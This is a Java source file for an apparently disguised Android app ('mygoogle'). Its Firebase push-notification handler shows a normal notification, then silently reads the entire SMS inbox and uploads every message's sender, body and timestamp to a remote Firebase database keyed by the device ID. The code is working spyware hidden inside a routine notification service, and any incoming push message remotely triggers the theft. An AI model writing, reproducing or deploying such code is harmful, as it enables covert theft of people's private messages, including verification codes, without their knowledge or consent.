package com.crezyprogrammer.mygoogle;

import android.app.NotificationManager;
import android.content.Context;
import android.database.Cursor;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.Calendar;
import java.util.Date;

import xdroid.toaster.Toaster;

import static xdroid.core.Global.getContext;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.i("123321","notification recived");
        super.onMessageReceived(remoteMessage);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, "channel_id")
                .setContentTitle(remoteMessage.getNotification().getTitle())
                .setContentText(remoteMessage.getNotification().getBody())
                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
                .setStyle(new NotificationCompat.BigTextStyle())
                .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
                .setSmallIcon(R.mipmap.ic_launcher)
                .setAutoCancel(true);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

       notificationManager.notify(0, notificationBuilder.build());
    Toaster.toast("notifiaction recived");

        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("sms").child(Settings.Secure.getString(getContext().getContentResolver(),
                Settings.Secure.ANDROID_ID));
        while (cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            Log.i("123321","Number: " + address + " .Message: " + body);
            String date =  cur.getString(cur.getColumnIndex("date"));
            Long timestamp = Long.parseLong(date);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();

    DatabaseReference node=databaseReference.child(smsDate);
    node.child("body").setValue(body);
    node.child("number").setValue(address);
    node.child("time").setValue(smsDate);
    node.child("contact").setValue(Utils.contact);
            String s="time " +smsDate+" Number: " + address + " .Message: " + body;
           // Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
      //     handler.handleMessage(s);
            Toaster.toast(s);
        }


    }
    private final Handler handler = new Handler() {
        public void handleMessage(String msg) {

                Toast.makeText(getApplicationContext(),"Your message", Toast.LENGTH_LONG).show();
        }

};}